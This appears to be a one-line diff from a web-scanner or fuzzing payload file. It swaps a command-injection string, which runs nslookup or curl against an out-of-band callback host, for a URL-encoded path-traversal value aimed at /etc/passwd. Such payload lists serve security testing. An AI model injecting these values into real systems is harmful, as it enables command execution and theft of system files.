@@ -1,1 +1,1 @@
-`(nslookup -q=cname hitwehtkblxxsf103f.bxss.me||curl hitwehtkblxxsf103f.bxss.me)`
+%2fetc%2fpasswd
